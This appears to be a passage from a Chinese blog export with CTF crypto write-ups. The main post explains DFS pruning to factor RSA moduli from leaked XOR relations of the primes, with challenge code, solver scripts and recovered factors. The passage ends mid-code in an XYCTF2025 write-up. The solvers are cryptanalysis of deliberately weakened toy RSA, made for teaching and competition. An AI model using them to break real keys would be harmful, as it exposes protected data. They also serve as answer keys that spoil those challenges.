<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    uint256 <span class="keyword">public</span> number;</span><br><span class="line">    function <span class="title function_">cat</span><span class="params">(uint256 cnumber)</span> <span class="keyword">public</span> &#123;</span><br><span class="line">        number=cnumber;</span><br><span class="line">        uint256 vv=<span class="number">5</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">something</span><span class="params">()</span><span class="keyword">public</span>&#123;</span><br><span class="line">        uint256 vv=<span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>blockchain</tag>
      </tags>
  </entry>
  <entry>
    <title>剪枝相关</title>
    <url>/2024/07/17/%E5%89%AA%E6%9E%9D%E7%9B%B8%E5%85%B3/</url>
    <content><![CDATA[<p>比赛时遇到了挺多剪枝相关的题，但是只会套板子，趁着有时间学习总结一下</p>
<span id="more"></span>

<h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><p>DFS之剪枝与优化指的是在执行深度优先搜索(DFS, Depth-First Search)时，采取的一系列策略来减少搜索空间，避免无效计算，从而加速找到问题的解。剪枝是指在搜索过程中，当遇到某些条件不符合解的要求或者可以预判后续搜索不会产生有效解时，直接放弃这条搜索路径，这一过程称为剪枝。优化则是指通过调整搜索策略、顺序等，提高搜索效率。</p>
<h1 id="题目（收集ing……"><a href="#题目（收集ing……" class="headerlink" title="题目（收集ing……)"></a>题目（收集ing……)</h1><h2 id="首尾剪枝"><a href="#首尾剪枝" class="headerlink" title="首尾剪枝"></a>首尾剪枝</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">256</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">_q = <span class="built_in">int</span>(<span class="built_in">bin</span>(q)[<span class="number">2</span>:][::-<span class="number">1</span>] , <span class="number">2</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p ^ _q)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">47761879279815109356923025519387920397647575481870870315845640832106405230526</span></span><br><span class="line"><span class="string">10310021142875344535823132048350287610122830618624222175188882916320750885684668357543070611134424902255744858233485983896082731376191044874283981089774677</span></span><br><span class="line"><span class="string">999963120986258459742830847940927620860107164857685447047839375819380831715400110131705491405902374029088041611909274341590559275004502111124764419485191</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>题目给出p 与 q 的反方向二进制的异或值，根据异或操作的特性，可知如果当前需搜索的最高位为”1”，则对应两种可能：p该位为1，q对应低位为0；p该位为0，q对应低位为1。对应的剪枝条件为</p>
<p>1.将p、q未搜索到的位全填0，乘积应小于n<br>2.将p、q未搜索到的位全填1，乘积应大于n<br>3.p、q 低 k 位乘积再取低 k 位，应与 n 的低 k 位相同</p>
<p>首先定义搜索函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">ph,qh,pl,ql</span>):</span><br><span class="line">    l = <span class="built_in">len</span>(ph)</span><br><span class="line">    tmp0 = ph + (<span class="number">256</span>-<span class="number">2</span>*l)*<span class="string">&quot;0&quot;</span> + pl</span><br><span class="line">    tmp1 = ph + (<span class="number">256</span>-<span class="number">2</span>*l)*<span class="string">&quot;1&quot;</span> + pl</span><br><span class="line">    tmq0 = qh + (<span class="number">256</span>-<span class="number">2</span>*l)*<span class="string">&quot;0&quot;</span> + ql</span><br><span class="line">    tmq1 = qh + (<span class="number">256</span>-<span class="number">2</span>*l)*<span class="string">&quot;1&quot;</span> + ql</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">int</span>(tmp0,<span class="number">2</span>)*<span class="built_in">int</span>(tmq0,<span class="number">2</span>) &gt; n):</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">int</span>(tmp1,<span class="number">2</span>)*<span class="built_in">int</span>(tmq1,<span class="number">2</span>) &lt; n):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">int</span>(pl,<span class="number">2</span>)*<span class="built_in">int</span>(ql,<span class="number">2</span>) % (<span class="number">2</span>**(l-<span class="number">1</span>)) != n % (<span class="number">2</span>**(l-<span class="number">1</span>))):</span><br><span class="line">        <span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<p>根据条件进行剪枝操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(l == <span class="number">128</span>):</span><br><span class="line">        pp0 = <span class="built_in">int</span>(tmp0,<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span>(n % pp0 == <span class="number">0</span>):</span><br><span class="line">            pf = pp0</span><br><span class="line">            qf = n//pp0</span><br><span class="line">            phi = (pf-<span class="number">1</span>)*(qf-<span class="number">1</span>)</span><br><span class="line">            d = inverse(e,phi)</span><br><span class="line">            m1 = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(m1))</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span>(pxorq[l] == <span class="string">&quot;1&quot;</span> <span class="keyword">and</span> pxorq[<span class="number">255</span>-l] == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">            find(ph+<span class="string">&quot;1&quot;</span>,qh+<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>+pl,<span class="string">&quot;0&quot;</span>+ql)</span><br><span class="line">            find(ph+<span class="string">&quot;0&quot;</span>,qh+<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>+pl,<span class="string">&quot;1&quot;</span>+ql)</span><br><span class="line">            find(ph+<span class="string">&quot;1&quot;</span>,qh+<span class="string">&quot;1&quot;</span>,<span class="string">&quot;0&quot;</span>+pl,<span class="string">&quot;0&quot;</span>+ql)</span><br><span class="line">            find(ph+<span class="string">&quot;0&quot;</span>,qh+<span class="string">&quot;1&quot;</span>,<span class="string">&quot;0&quot;</span>+pl,<span class="string">&quot;1&quot;</span>+ql)</span><br><span class="line">        <span class="keyword">elif</span>(pxorq[l] == <span class="string">&quot;1&quot;</span> <span class="keyword">and</span> pxorq[<span class="number">255</span>-l] == <span class="string">&quot;0&quot;</span>):</span><br><span class="line">            find(ph+<span class="string">&quot;1&quot;</span>,qh+<span class="string">&quot;0&quot;</span>,<span class="string">&quot;0&quot;</span>+pl,<span class="string">&quot;0&quot;</span>+ql)</span><br><span class="line">            find(ph+<span class="string">&quot;0&quot;</span>,qh+<span class="string">&quot;0&quot;</span>,<span class="string">&quot;0&quot;</span>+pl,<span class="string">&quot;1&quot;</span>+ql)</span><br><span class="line">            find(ph+<span class="string">&quot;1&quot;</span>,qh+<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>+pl,<span class="string">&quot;0&quot;</span>+ql)</span><br><span class="line">            find(ph+<span class="string">&quot;0&quot;</span>,qh+<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>+pl,<span class="string">&quot;1&quot;</span>+ql)</span><br><span class="line">        <span class="keyword">elif</span>(pxorq[l] == <span class="string">&quot;0&quot;</span> <span class="keyword">and</span> pxorq[<span class="number">255</span>-l] == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">            find(ph+<span class="string">&quot;0&quot;</span>,qh+<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>+pl,<span class="string">&quot;0&quot;</span>+ql)</span><br><span class="line">            find(ph+<span class="string">&quot;0&quot;</span>,qh+<span class="string">&quot;1&quot;</span>,<span class="string">&quot;0&quot;</span>+pl,<span class="string">&quot;0&quot;</span>+ql)</span><br><span class="line">            find(ph+<span class="string">&quot;1&quot;</span>,qh+<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>+pl,<span class="string">&quot;1&quot;</span>+ql)</span><br><span class="line">            find(ph+<span class="string">&quot;1&quot;</span>,qh+<span class="string">&quot;1&quot;</span>,<span class="string">&quot;0&quot;</span>+pl,<span class="string">&quot;1&quot;</span>+ql)</span><br><span class="line">        <span class="keyword">elif</span>(pxorq[l] == <span class="string">&quot;0&quot;</span> <span class="keyword">and</span> pxorq[<span class="number">255</span>-l] == <span class="string">&quot;0&quot;</span>):</span><br><span class="line">            find(ph+<span class="string">&quot;0&quot;</span>,qh+<span class="string">&quot;0&quot;</span>,<span class="string">&quot;0&quot;</span>+pl,<span class="string">&quot;0&quot;</span>+ql)</span><br><span class="line">            find(ph+<span class="string">&quot;1&quot;</span>,qh+<span class="string">&quot;0&quot;</span>,<span class="string">&quot;0&quot;</span>+pl,<span class="string">&quot;1&quot;</span>+ql)</span><br><span class="line">            find(ph+<span class="string">&quot;0&quot;</span>,qh+<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>+pl,<span class="string">&quot;0&quot;</span>+ql)</span><br><span class="line">            find(ph+<span class="string">&quot;1&quot;</span>,qh+<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>+pl,<span class="string">&quot;1&quot;</span>+ql)</span><br></pre></td></tr></table></figure>

<h2 id="2-名称待定"><a href="#2-名称待定" class="headerlink" title="2(名称待定)"></a>2(名称待定)</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myGetPrime</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = getRandomNBitInteger(<span class="number">1024</span>) &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">1024</span>) - <span class="number">1</span>)//<span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(x):</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line">p = myGetPrime()</span><br><span class="line">q = myGetPrime()</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">message = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">m = bytes_to_long(message.read())</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;superstitious-2.txt&quot;</span>, <span class="string">&quot;w&quot;</span>).write(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>\ne = <span class="subst">&#123;e&#125;</span>\nc = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>首先关注一下((1 &lt;&lt; 1024) - 1)&#x2F;&#x2F;3这个数，发现是10101010……01，适合剪枝，根据逻辑与操作的特点：全一为一，有零为零。且p*q的低位等于n的低位.</p>
<p>首先知道p和q末尾必是01，再逐步从后向前进行剪枝，又因为只有奇数位有1，每次可以操作两位，用01和00搭配可能性即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">550201148354755741271315125069984668413716061796183554308291706476140978529375848655819753667593579308959498512392008673328929157581219035186964125404507736120739215348759388064536447663960474781494820693212364523703341226714116205457869455356277737202439784607342540447463472816215050993875701429638490180199815506308698408730404219351173549572700738532419937183041379726568197333982735249868511771330859806268212026233242635600099895587053175025078998220267857284923478523586874031245098448804533507730432495577952519158565255345194711612376226297640371430160273971165373431548882970946865209008499974693758670929</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">12785320910832143088122342957660384847883123024416376075086619647021969680401296902000223390419402987207599720081750892719692986089224687862496368722454869160470101334513312534671470957897816352186267364039566768347665078311312979099890672319750445450996125821736515659224070277556345919426352317110605563901547710417861311613471239486750428623317970117574821881877688142593093266784366282508041153548993479036139219677970329934829870592931817113498603787339747542136956697591131562660228145606363369396262955676629503331736406313979079546532031753085902491581634604928829965989997727970438591537519511620204387132</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findp</span>(<span class="params">p, q</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(p) == <span class="number">1024</span>:</span><br><span class="line">        pp = <span class="built_in">int</span>(p, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> n % pp == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(pp)</span><br><span class="line">            <span class="built_in">print</span>(n // pp)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        l = <span class="built_in">len</span>(p)</span><br><span class="line">        pp = <span class="built_in">int</span>(p, <span class="number">2</span>)</span><br><span class="line">        qq = <span class="built_in">int</span>(q, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> pp * qq % (<span class="number">2</span>**l) == n % (<span class="number">2</span>**l):</span><br><span class="line">            findp(<span class="string">&quot;01&quot;</span> + p, <span class="string">&quot;01&quot;</span> + q)</span><br><span class="line">            findp(<span class="string">&quot;01&quot;</span> + p, <span class="string">&quot;00&quot;</span> + q)</span><br><span class="line">            findp(<span class="string">&quot;00&quot;</span> + p, <span class="string">&quot;01&quot;</span> + q)</span><br><span class="line">            findp(<span class="string">&quot;00&quot;</span> + p, <span class="string">&quot;00&quot;</span> + q)</span><br><span class="line"></span><br><span class="line">findp(<span class="string">&#x27;01&#x27;</span>,<span class="string">&#x27;01&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="number">11466867937506443031079406557463511000236825156042986330491372554263065048494616429572254582549332374593524344514321333368747919034845244563606383834070804967345648840205613712911286600828703809116499141392947298788689558078395325755136448592591616295144118450804581480471547613492025968699740517273286296657</span></span><br><span class="line">q = n // p</span><br><span class="line">d = inverse(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure>

<h2 id="3，已知p-q"><a href="#3，已知p-q" class="headerlink" title="3，已知p^q"></a>3，已知p^q</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line">n = p*q</span><br><span class="line">xor = p^q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;xor = <span class="subst">&#123;xor&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n = 81273634095521392491945168120330007101677085824054016784875224305683560308213</span></span><br><span class="line"><span class="comment">#xor = 55012774068906519160740720236510369652</span></span><br></pre></td></tr></table></figure>

<p>​        搜索条件：</p>
<ul>
<li><p>从低位向高位搜索</p>
</li>
<li><p>若xor当前位为1，则可能为两种情况：p为1，q为0 或者 p为0，q为1；反之xor当前位为0，则p为1，q为1 或者 p为0，q为0.</p>
<p>剪枝条件：</p>
<ul>
<li>将p和q剩下位全部填充为1，需要满足 p*q &gt; n</li>
<li>将p和q剩下位全部填充为0，需要满足 p*q &lt; n</li>
</ul>
</li>
</ul>
<p>其实算是第一道题的简化版，当p*q&#x3D;n或者n mod p&#x3D;0时结束</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">81273634095521392491945168120330007101677085824054016784875224305683560308213</span></span><br><span class="line">xor = <span class="number">55012774068906519160740720236510369652</span></span><br><span class="line">pbits = <span class="number">128</span></span><br><span class="line">ph = <span class="string">&#x27;&#x27;</span></span><br><span class="line">qh = <span class="string">&#x27;&#x27;</span></span><br><span class="line">xor = <span class="built_in">str</span>(<span class="built_in">bin</span>(xor)[<span class="number">2</span>:]).zfill(pbits)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">ph,qh</span>):</span><br><span class="line">    l0 = <span class="built_in">len</span>(ph)</span><br><span class="line">    l1 = <span class="built_in">len</span>(qh)</span><br><span class="line">    tmp0 = ph + <span class="string">&#x27;0&#x27;</span> * (pbits-l0)</span><br><span class="line">    tmp1 = ph + <span class="string">&#x27;1&#x27;</span> * (pbits-l0)</span><br><span class="line">    tmq0 = qh + <span class="string">&#x27;0&#x27;</span> * (pbits-l1)</span><br><span class="line">    tmq1 = qh + <span class="string">&#x27;1&#x27;</span> * (pbits-l1)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(tmp0,<span class="number">2</span>) * <span class="built_in">int</span>(tmq0,<span class="number">2</span>) &gt; n:<span class="comment">#剪枝条件1</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(tmp1,<span class="number">2</span>) * <span class="built_in">int</span>(tmq1,<span class="number">2</span>) &lt; n:<span class="comment">#剪枝条件2</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> l0 == pbits:<span class="comment">#结束条件</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(ph,<span class="number">2</span>) * <span class="built_in">int</span>(qh,<span class="number">2</span>) == n:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;<span class="built_in">int</span>(ph,<span class="number">2</span>)&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;q = <span class="subst">&#123;<span class="built_in">int</span>(qh,<span class="number">2</span>)&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> xor[l1] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            find(ph+<span class="string">&#x27;0&#x27;</span>,qh+<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            find(ph + <span class="string">&#x27;1&#x27;</span>,qh+<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            find(ph+<span class="string">&#x27;1&#x27;</span>,qh+<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            find(ph + <span class="string">&#x27;0&#x27;</span>,qh+<span class="string">&#x27;0&#x27;</span>)    </span><br><span class="line"></span><br><span class="line">find(ph,qh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 270451921611135557038833183249275131423</span></span><br><span class="line"><span class="string">q = 300510470073047693263940829088190906731</span></span><br><span class="line"><span class="string">p = 300510470073047693263940829088190906731</span></span><br><span class="line"><span class="string">q = 270451921611135557038833183249275131423</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="4，p-q-16）"><a href="#4，p-q-16）" class="headerlink" title="4，p ^(q &gt;&gt; 16）"></a>4，p ^(q &gt;&gt; 16）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> secret, flag</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">b&quot;dasctf&#123;&quot;</span> + secret + <span class="string">b&quot;&#125;&quot;</span></span><br><span class="line">e = <span class="number">11</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">P = getPrime(<span class="number">512</span>)</span><br><span class="line">Q = getPrime(<span class="number">512</span>)</span><br><span class="line">N = P * Q</span><br><span class="line">gift = P ^ (Q &gt;&gt; <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(N, gift, <span class="built_in">pow</span>(n, e, N))</span><br><span class="line"><span class="built_in">print</span>(encrypt(bytes_to_long(secret)),</span><br><span class="line">    encrypt(bytes_to_long(flag)))</span><br><span class="line"></span><br><span class="line">N = <span class="number">75000029602085996700582008490482326525611947919932949726582734167668021800854674616074297109962078048435714672088452939300776268788888016125632084529419230038436738761550906906671010312930801751000022200360857089338231002088730471277277319253053479367509575754258003761447489654232217266317081318035524086377</span></span><br><span class="line">gift = <span class="number">8006730615575401350470175601463518481685396114003290299131469001242636369747855817476589805833427855228149768949773065563676033514362512835553274555294034</span></span><br><span class="line"><span class="built_in">pow</span>(n,e,N) = <span class="number">14183763184495367653522884147951054630177015952745593358354098952173965560488104213517563098676028516541915855754066719475487503348914181674929072472238449853082118064823835322313680705889432313419976738694317594843046001448855575986413338142129464525633835911168202553914150009081557835620953018542067857943</span></span><br><span class="line"><span class="built_in">pow</span>(secret,e,n) = <span class="number">69307306970629523181683439240748426263979206546157895088924929426911355406769672385984829784804673821643976780928024209092360092670457978154309402591145689825571209515868435608753923870043647892816574684663993415796465074027369407799009929334083395577490711236614662941070610575313972839165233651342137645009</span></span><br><span class="line"><span class="built_in">pow</span>(flag,e,n) = <span class="number">46997465834324781573963709865566777091686340553483507705539161842460528999282057880362259416654012854237739527277448599755805614622531827257136959664035098209206110290879482726083191005164961200125296999449598766201435057091624225218351537278712880859703730566080874333989361396420522357001928540408351500991</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里只看一下通过剪枝分解n的操作，其实与上一道题差别不大，但是剪枝条件有所变化。</p>
<p>1，(pp ^ (qq &gt;&gt; 16)) % (2 ** l) &#x3D;&#x3D; gift % (2 ** l) </p>
<p>2，pp * qq % (2 ** l) &#x3D;&#x3D; N % (2 ** l)</p>
<p>第二点感觉是都有的，第一点根据题目信息改动即可</p>
<p>tips：因为gift是p异或q右移16位的结果，所以p的最后一位1相当于异或了q的第十七位。这也就是为什么只搜p而不是同时搜p，q，传入的也不是q的末位1而是q的末17位，在调用函数的时候才会有爆破了q后17位的操作。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">N=<span class="number">75000029602085996700582008490482326525611947919932949726582734167668021800854674616074297109962078048435714672088452939300776268788888016125632084529419230038436738761550906906671010312930801751000022200360857089338231002088730471277277319253053479367509575754258003761447489654232217266317081318035524086377</span></span><br><span class="line">gift=<span class="number">8006730615575401350470175601463518481685396114003290299131469001242636369747855817476589805833427855228149768949773065563676033514362512835553274555294034</span></span><br><span class="line">c1=<span class="number">14183763184495367653522884147951054630177015952745593358354098952173965560488104213517563098676028516541915855754066719475487503348914181674929072472238449853082118064823835322313680705889432313419976738694317594843046001448855575986413338142129464525633835911168202553914150009081557835620953018542067857943</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findp</span>(<span class="params">p,q</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(p)==<span class="number">512</span>:</span><br><span class="line">        p1=<span class="built_in">int</span>(p,<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> N % p1 ==<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(p1,N//p1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bit=<span class="built_in">len</span>(p)</span><br><span class="line">        p1=<span class="built_in">int</span>(p,<span class="number">2</span>)</span><br><span class="line">        q1=<span class="built_in">int</span>(q,<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> (p1^(q1&gt;&gt;<span class="number">16</span>))%(<span class="number">2</span>**bit)==gift%(<span class="number">2</span>**bit) <span class="keyword">and</span> p1*q1%(<span class="number">2</span>**bit)==N%(<span class="number">2</span>**bit):<span class="comment">#当目前深搜出来的位数符合实际，继续搜索。</span></span><br><span class="line">            findp(<span class="string">&#x27;1&#x27;</span>+p,<span class="string">&#x27;1&#x27;</span>+q)</span><br><span class="line">            findp(<span class="string">&#x27;0&#x27;</span>+p,<span class="string">&#x27;1&#x27;</span>+q)</span><br><span class="line">            findp(<span class="string">&#x27;0&#x27;</span>+p,<span class="string">&#x27;0&#x27;</span>+q)</span><br><span class="line">            findp(<span class="string">&#x27;1&#x27;</span>+p,<span class="string">&#x27;0&#x27;</span>+q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">17</span>):</span><br><span class="line">    findp(<span class="string">&#x27;1&#x27;</span>,<span class="built_in">bin</span>(i)[<span class="number">2</span>:])<span class="comment">#其中i可以看作q的低位</span></span><br></pre></td></tr></table></figure>

<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>时间关系先暂时收录这四种题型，其实归根结底都是一种问题，即通过p*q&#x3D;n和题目给出的条件进行剪枝分解n，</p>
<p>关于剪枝，其实感觉没有特定的做法，而是一种思想，就是通过各种方法减少搜索规模，从而提高效率。目前遇到的剪枝都是在RSA中，或许其他的密码体系也会有着这种思想存在？</p>
<p>还感觉比较重要的一点是搜索的顺序，剪枝是一种方法，但是有些时候我们可以通过该变搜索的顺序来进一步提高效率，包括上述提到的首尾剪枝，低位向高位剪枝……继续深挖下去发现涉及到更深一步的算法待后续研究。任重而道远捏{}</p>
]]></content>
      <tags>
        <tag>NOTE</tag>
      </tags>
  </entry>
  <entry>
    <title>XYCTF2025</title>
    <url>/2025/04/07/XYCTF2025/</url>
    <content><![CDATA[<p>OWO</p>
<p>梦开始的地方。</p>
<span id="more"></span>

<h1 id="1-Complex-signin"><a href="#1-Complex-signin" class="headerlink" title="1,Complex_signin"></a>1,Complex_signin</h1><p>题目</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, re, im</span>):</span><br><span class="line">        self.re = re</span><br><span class="line">        self.im = im</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, c</span>):</span><br><span class="line">        re_ = self.re * c.re - self.im * c.im</span><br><span class="line">        im_ = self.re * c.im + self.im * c.re</span><br><span class="line">        <span class="keyword">return</span> Complex(re_, im_)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, c</span>):</span><br><span class="line">        <span class="keyword">return</span> self.re == c.re <span class="keyword">and</span> self.im == c.im</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__rshift__</span>(<span class="params">self, m</span>):</span><br><span class="line">        <span class="keyword">return</span> Complex(self.re &gt;&gt; m, self.im &gt;&gt; m)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__lshift__</span>(<span class="params">self, m</span>):</span><br><span class="line">        <span class="keyword">return</span> Complex(self.re &lt;&lt; m, self.im &lt;&lt; m)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.im == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(self.re)</span><br><span class="line">        <span class="keyword">elif</span> self.re == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(self.im) == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> <span class="keyword">if</span> self.im &lt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span>i&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.im&#125;</span>i&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.re&#125;</span> <span class="subst">&#123;<span class="string">&#x27;+&#x27;</span> <span class="keyword">if</span> self.im &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;-&#x27;</span>&#125;</span> <span class="subst">&#123;<span 